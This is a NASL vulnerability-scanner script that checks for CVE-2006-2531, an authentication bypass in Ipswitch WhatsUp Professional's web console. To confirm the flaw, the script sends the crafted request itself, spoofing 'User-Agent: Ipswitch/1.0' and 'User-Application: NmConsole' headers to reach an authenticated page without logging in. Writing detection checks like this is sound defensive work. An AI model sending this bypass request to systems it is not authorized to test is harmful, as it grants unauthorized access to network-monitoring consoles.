# SPDX-FileCopyrightText: 2008 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80067");
  script_version("2023-08-01T13:29:10+0000");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-2531");
  script_name("Ipswitch WhatsUp Professional Authentication bypass detection");
  script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2008 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8022);
  script_mandatory_keys("Ipswitch/banner");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to WhatsUp Professional 2006.01 or later.");

  script_tag(name:"summary", value:"The remote web server is affected by an authentication bypass flaw.");

  script_tag(name:"impact", value:"The version of WhatsUp Professional installed on the remote host
  allows an attacker to bypass authentication with a specially-crafted request.");

  script_xref(name:"URL", value:"http://www.ftusecurity.com/pub/whatsup.public.pdf");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/18019");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/434247/30/0/threaded");
  script_xref(name:"URL", value:"http://www.ipswitch.com/support/whatsup_professional/releases/wup200601.asp");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:8022);
banner = http_get_remote_headers(port:port);
if(!banner || "Server: Ipswitch" >!< banner)
  exit(0);

useragent = http_get_user_agent();
host = http_host_name( port:port );

req = string(
  'GET /NmConsole/Default.asp?bIsJavaScriptDisabled=false HTTP/1.1\r\n',
  'Host: ', host, '\r\n',
  'User-Agent: ', useragent, '\r\n',
  'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*.*;q=0.5\r\n',
  'Accept-Language: en-us,en;q=0.5\r\n',
  'Accept-Encoding: gzip,deflate\r\n',
  'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n',
  'Referer: http://', host, '/\r\n',
  '\r\n'
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if(res == NULL)exit(0);


# If so...
if ("Location: /NmConsole/Login.asp" >< res)
{
  req = string(
    'GET /NmConsole/Default.asp?bIsJavaScriptDisabled=false HTTP/1.1\r\n',
    'Host: ', host, '\r\n',
    'User-Agent: Ipswitch/1.0\r\n',
    'User-Application: NmConsole\r\n',
    'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*.*;q=0.5\r\n',
    'Accept-Language: en-us,en;q=0.5\r\n',
    'Accept-Encoding: gzip,deflate\r\n',
    'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n',
    'Referer: http://', host, '/\r\n',
    '\r\n'
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if(!res)exit(0);

  # There's a problem if we're now authenticated.
  if ("<title>Group Device List for" >< res) security_message(port);
}
